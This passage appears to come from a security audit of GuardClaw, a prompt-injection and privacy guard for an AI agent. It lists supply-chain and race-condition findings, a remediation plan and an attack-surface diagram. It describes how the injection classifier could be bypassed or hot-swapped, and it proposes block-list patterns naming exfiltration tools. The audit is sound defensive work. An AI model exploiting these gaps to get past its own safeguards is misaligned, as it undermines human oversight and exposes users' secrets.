`torch` and `transformers` have a large attack surface: they execute arbitrary code during model loading and have known deserialization vulnerabilities in older pickle-based formats.

**Recommended fix:**
1. Pin exact versions with hashes in a `requirements.txt`:
   ```
   fastapi==0.115.6 --hash=sha256:...
   uvicorn==0.34.0  --hash=sha256:...
   ```
2. Use `pip install --require-hashes -r requirements.txt` to enforce integrity.
3. Consider vendoring or using a private PyPI mirror for production deployments.

---

### GCF-022 — High | HuggingFace Model Without Version/Hash Pinning

**Component:** `scripts/install.sh`, `src/injection/deberta.ts`

**Attack scenario:**
The DeBERTa model `protectai/deberta-v3-base-prompt-injection-v2` is downloaded from HuggingFace Hub at service startup and can be hot-swapped via the `/reload` endpoint. HuggingFace model versions are mutable by the repository owner — a model updated to a backdoored version would be downloaded transparently.

Combined with `deberta.autoUpdate: true` in the default config, the model advisor can trigger a reload at any time, pulling whatever is currently published under that model ID.

**Recommended fix:**
1. Pin the model to a specific commit hash using HuggingFace's `revision` parameter:
   ```python
   AutoModelForSequenceClassification.from_pretrained(
       "protectai/deberta-v3-base-prompt-injection-v2",
       revision="<commit-sha>"
   )
   ```
2. Verify model card metadata hash after download.
3. Default `deberta.autoUpdate` to `false`; make explicit opt-in with changelog review.

---

### GCF-023 — Medium | `npm ci` Without Audit; Dev Dependencies in Production

**Component:** `scripts/install.sh`

**Attack scenario:**
```bash
npm ci --include=dev 2>&1 | tail -3
```

`npm ci` uses `package-lock.json` for deterministic installs, which is good. However:
1. No `npm audit` is run — known high/critical vulnerabilities in installed packages are not surfaced.
2. `--include=dev` installs development dependencies (build tools, test frameworks) into the production install directory. Dev deps typically have looser security requirements and broader attack surface.

**Recommended fix:**
1. Add `npm audit --audit-level=high` after `npm ci` and fail the install if any high/critical vulnerabilities are found.
2. Build and then separate: `npm ci --include=dev && npm run build && npm prune --production` to remove dev dependencies from the final install.

---

### GCF-024 — Medium | Auto-Ban Read-Modify-Write Race on `guardclaw.json`

**Component:** `src/hooks.ts` and `src/privacy-proxy.ts` — auto-ban logic

**Attack scenario:**
Both `hooks.ts` and `privacy-proxy.ts` independently implement the auto-ban write:
```typescript
fs.promises.readFile(GUARDCLAW_JSON_PATH, 'utf8')
  .then((raw) => {
    const cfg = JSON.parse(raw);
    cfg.privacy.injection.banned_senders = newBanned;
    return fs.promises.writeFile(GUARDCLAW_JSON_PATH, JSON.stringify(cfg, null, 2));
  })
```

Two simultaneous injection attempts from different senders (or the same sender hitting both the hook and proxy paths) can race:
1. Both read the same `guardclaw.json` state
2. Both compute `newBanned` independently
3. The second write overwrites the first → one sender's ban is lost

Additionally, `pendingBans` is a `Set` but it is module-level — if hooks.ts and privacy-proxy.ts both run in the same Node.js process (they do — same plugin bundle), `pendingBans` is shared, which prevents most double-banning but does not handle the filesystem race.

**Recommended fix:**
Use an exclusive write lock (e.g., `proper-lockfile` npm package) around the read-modify-write cycle for `guardclaw.json`. Or centralize config mutation in a single module with an async queue/mutex.

---

### GCF-025 — Medium | `syncMemoryToClean()` TOCTOU

**Component:** `src/memory-isolation.ts` — `syncMemoryToClean()`, `mergeCleanIntoFull()`

**Attack scenario:**
The sync flow is:
1. Read `MEMORY.md` (clean)
2. Read `MEMORY-FULL.md` (full)
3. Compute delta
4. Append delta to `MEMORY-FULL.md`
5. Filter guard content from `MEMORY-FULL.md`
6. Redact PII
7. Write `MEMORY.md`

Steps 1-7 are not atomic. If two sessions trigger `syncAllMemoryToClean()` concurrently (e.g., two sessions ending simultaneously after `session_end`):
- Both read the same `MEMORY-FULL.md` at step 2
- Both append to `MEMORY-FULL.md` at step 4 — duplicate cloud additions
- Both write `MEMORY.md` at step 7 — last write wins, losing the other session's contributions

**Recommended fix:**
Use an advisory lock file (e.g., `~/.openclaw/memory-sync.lock`) around the full sync operation. Node.js `fs.promises.open` with `O_EXCL` provides atomic lock file creation.

---

### GCF-026 — Low | `syncMemoryWrite` Fire-and-Forget: Process-Crash Memory Divergence

**Component:** `src/hooks.ts` — `tool_result_persist` memory dual-write block

**Attack scenario:**
```typescript
syncMemoryWrite(writePath, workspaceDir, privacyConfig, api.logger, ...).catch((err) => {
  api.logger.warn(`[GuardClaw] Memory dual-write sync failed: ${String(err)}`);
});
// hook returns synchronously — gateway may process next event before sync completes
```

`tool_result_persist` returns immediately after launching the async `syncMemoryWrite`. If the process is killed (SIGKILL, OOM, crash) between the hook return and the async write completing, the write never happens. Over time, repeated crashes cause `MEMORY-FULL.md` to drift behind the actual session history, leading to a persistent audit gap.

**Recommended fix:**
Use `before_reset` and `session_end` hooks (which are already async and awaited) as the primary memory sync points, and make `syncMemoryWrite` in `tool_result_persist` best-effort with explicit tracking of pending writes for reconciliation at next startup.

---

## Prioritised Remediation List

### Immediate (fix before next deployment)

1. **GCF-020 — Supply chain: pin git clone to a commit SHA and verify GPG signature.** An unverified clone is a permanent RCE foothold for any GitHub account compromise.
2. **GCF-017 — Validate `GUARDCLAW_DEBERTA_URL` to loopback-only.** One environment variable change = complete injection bypass + exfiltration.
3. **GCF-018 — Add API token auth to `/reload` and allowlist model IDs.** Unauthenticated hot-swap disables S0 without any log noise.
4. **GCF-009 — Add `mode: 0o600` to all sensitive file writes** (`MEMORY-FULL.md`, `full.jsonl`, `guardclaw.json`, logs). Trivially fixable; unredacted secrets are currently world-readable.
5. **GCF-010 — Add symlink guards (`O_NOFOLLOW` or lstat check) on memory read/write.** A pre-planted symlink enables arbitrary file overwrite on next session_end.

### Short-term (next sprint)

6. **GCF-003 — Move injection detection into `tool_result_persist` (synchronous).** The async stash race means injection payloads in tool results may silently bypass S0.
7. **GCF-014 — Change pending-taint from single-slot to per-session queue.** Concurrent secrets-mount reads silently lose one taint registration.
8. **GCF-004 — Add `before_tool_call` path checks for all tools (not just exec) that read S3 paths.** S3 late detection is partially mitigatable with earlier blocking.
9. **GCF-021 — Pin Python dependencies with `--require-hashes`.** The DeBERTa service runs as a persistent daemon with auto-restart; package compromise has persistent impact.
10. **GCF-022 — Pin HuggingFace model to a commit SHA; default `autoUpdate: false`.** Silent classifier replacement is a realistic supply-chain attack.
11. **GCF-015 — Add `git`, `aws`, `gsutil`, `az`, `docker push`, DNS exfil patterns to `GUARD_BASH_NETWORK_PATTERNS`.**
12. **GCF-008 — Replace all remaining `isGuardSessionKey()` calls with `isVerifiedGuardSession()`.** Consistency fix for the already-implemented registry mechanism.

### Medium-term (within a quarter)

13. **GCF-001 — Add Unicode normalization (`NFKD`) before keyword/pattern matching.**
14. **GCF-002 — Implement cross-turn sliding context buffer for pattern detection.**
15. **GCF-012 — Change taint cap from silent drop to LRU eviction; log at WARN when cap is hit.**
16. **GCF-006 — Adopt maintained credential pattern library (trufflehog/gitleaks ruleset) as defaults.**
17. **GCF-024 — Add file lock around `guardclaw.json` read-modify-write.**
18. **GCF-019 — Bind DeBERTa service to `127.0.0.1` explicitly in plist/systemd unit; add API key.**
19. **GCF-016 — Block `eval`, `exec`, `source` in guard bash sessions; add obfuscation-resistant normalization.**
20. **GCF-025 — Add advisory lock file around `syncMemoryToClean()` for concurrent sessions.**

---

## Appendix: Architecture Attack Surface Summary

```
 ┌──────────────────────────────────────────────────────────────────┐
 │  Attack surface: External (user/tool results/network responses)   │
 └──────────────────────────────────────────────────────────────────┘
         ↓ before_model_resolve (Hook 1)
 ┌─────────────────────────────────┐
 │  S0: Injection detection        │ ← GCF-017,018,019 (DeBERTa SSRF/swap/auth)
 │  DeBERTa + Heuristics           │ ← GCF-003 (async race)
 └─────────────────────────────────┘
         ↓ detectByRules (fast pre-check)
 ┌─────────────────────────────────┐
 │  S1/S2/S3 Classification        │ ← GCF-001,002,006 (encoding, chunking, gaps)
 │  rules.ts + local LLM           │ ← GCF-005 (ReDoS checker)
 └─────────────────────────────────┘
         ↓ before_tool_call (Hook 3)
 ┌─────────────────────────────────┐
 │  Guard session isolation        │ ← GCF-015,016 (network pattern gaps)
 │  Taint mark + high-risk block   │ ← GCF-014 (pending taint race)
 │  Memory path guard              │ ← GCF-007,008 (allowlist bypass)
 └─────────────────────────────────┘
         ↓ after_tool_call (Hook 3b/3c)  ← ASYNC — race with Hook 4
         ↓ tool_result_persist (Hook 4)
 ┌─────────────────────────────────┐
 │  Taint consume + register       │ ← GCF-012,013 (flood, min-length)
 │  PII redaction + dual-write     │ ← GCF-004 (S3 too late)
 │  Memory write sync              │ ← GCF-009,010 (perms, symlinks)
 └─────────────────────────────────┘
         ↓ session_end
 ┌─────────────────────────────────┐
 │  Memory sync (FULL → CLEAN)     │ ← GCF-025,026 (TOCTOU, fire-and-forget)
 │  Config mutation (auto-ban)     │ ← GCF-024 (RMW race)
 └─────────────────────────────────┘
         ↓
 ┌─────────────────────────────────┐
 │  Install-time / supply chain    │ ← GCF-020,021,022,023 (git, pip, HF, npm)
 └─────────────────────────────────┘
```
